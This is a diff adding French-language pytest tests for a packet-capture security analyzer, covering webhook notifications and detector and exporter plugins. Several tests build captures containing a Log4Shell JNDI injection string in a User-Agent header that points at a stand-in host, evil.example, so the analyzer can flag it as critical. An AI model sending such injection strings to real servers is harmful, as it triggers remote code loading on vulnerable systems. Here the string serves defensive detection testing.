@@ -178,3 +178,97 @@ def test_pcap_legitime_sans_base_cve_ne_pretend_pas_avoir_verifie(monkeypatch, c
     assert "Aucune base CVE fournie (--cve-db)" in out
     assert "score de risque global : 0/100" in out
     assert "CVE confirmees : 0" in out
+
+
+# -- notifications (issue #280) sur la chaine complete ---------------------------------
+
+
+def test_pcap_notification_webhook_resume_anonymise(monkeypatch, capsys, tmp_path, cve_db):
+    import json
+    import threading
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+
+    bodies = []
+
+    class Handler(BaseHTTPRequestHandler):
+        def do_POST(self):
+            bodies.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
+            self.send_response(200)
+            self.end_headers()
+
+        def log_message(self, *_a):
+            pass
+
+    server = HTTPServer(("127.0.0.1", 0), Handler)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    monkeypatch.chdir(tmp_path)
+    pcap = tmp_path / "attaque.pcap"
+    log4shell = _request("/", {"User-Agent": "${jndi:ldap://evil.example/a}"})
+    _write_http_capture(pcap, [_request("/"), log4shell], "Apache/2.4.49 (Unix)")
+    argv = ["cross_capture_analyzer_cli.py", "--capture", f"LAN={pcap}", "--security-report", "--cve-db", str(cve_db)]
+    argv += ["--notify-on", "elevee", "--notify-webhook", f"http://127.0.0.1:{server.server_address[1]}/h"]
+    argv += ["--notify-state", str(tmp_path / "state.json")]
+    monkeypatch.setattr(sys, "argv", argv)
+    try:
+        cli.main()
+    finally:
+        server.shutdown()
+        server.server_close()
+    out = capsys.readouterr().out
+    assert "notification webhook : envoyee" in out
+    assert len(bodies) == 1  # une notification pour toute l'analyse
+    body = json.dumps(bodies[0])
+    assert bodies[0]["level"] == "critique"
+    assert SERVER not in body and CLIENT not in body and "Apache/2.4.49" not in body
+
+
+def test_pcap_sans_notify_on_aucun_appel_reseau(monkeypatch, capsys, tmp_path, cve_db):
+    def refuse(*_a, **_k):
+        raise AssertionError("appel reseau interdit")
+
+    monkeypatch.setenv("NETCROSS_SLACK_WEBHOOK", "https://hooks.example/s")
+    monkeypatch.setattr(socket, "socket", refuse)
+    monkeypatch.setattr(socket, "create_connection", refuse)
+    pcap = tmp_path / "attaque.pcap"
+    _write_http_capture(pcap, [_request("/", {"User-Agent": "${jndi:ldap://evil.example/a}"})], "Apache/2.4.49")
+    out = _run_security_report(monkeypatch, capsys, pcap, cve_db)
+    assert "(niveau : critique)" in out
+    assert "Notifications" not in out
+
+
+# -- plugins (issue #284) sur la chaine complete ------------------------------------
+
+
+def test_pcap_plugins_detecteur_en_erreur_et_exporteur(monkeypatch, capsys, tmp_path, cve_db):
+    plugin = tmp_path / "site.py"
+    plugin.write_text(
+        "class Fragile:\n"
+        "    name = 'fragile'\n"
+        "    def analyse(self, contexte):\n"
+        "        raise RuntimeError('protocole inattendu')\n\n"
+        "class Http:\n"
+        "    name = 'http_site'\n"
+        "    def analyse(self, contexte):\n"
+        "        n = sum(1 for p in contexte.packets if p.dport == 80)\n"
+        "        return [{'category': 'anomalie', 'severity': 'moyenne', 'detail': f'{n} paquets vers :80'}]\n\n"
+        "class Compte:\n"
+        "    name = 'compte'\n"
+        "    def export(self, report, chemin):\n"
+        "        chemin.write_text(str(len(report.security_findings)))\n\n"
+        "DETECTORS = [Fragile, Http]\nEXPORTERS = [Compte]\n",
+        encoding="utf-8",
+    )
+    pcap = tmp_path / "attaque.pcap"
+    _write_http_capture(pcap, [_request("/", {"User-Agent": "${jndi:ldap://evil.example/a}"})], "Apache/2.4.49 (Unix)")
+    out_file = tmp_path / "compte.txt"
+    argv = ["cross_capture_analyzer_cli.py", "--capture", f"LAN={pcap}", "--security-report", "--cve-db", str(cve_db)]
+    argv += ["--plugin-path", str(plugin), "--plugins", "fragile,http_site,compte"]
+    argv += ["--plugin-export", f"compte={out_file}"]
+    monkeypatch.setattr(sys, "argv", argv)
+    cli.main()
+    out = capsys.readouterr().out
+    assert "detecteur fragile : erreur, constats absents -- RuntimeError: protocole inattendu" in out
+    assert "detecteur http_site : ok, 1 constat(s)" in out
+    assert "[plugin http_site]" in out
+    assert f"exporteur compte : ok, ecrit dans {out_file}" in out
+    assert int(out_file.read_text()) >= 2  # constats du coeur + celui du plugin
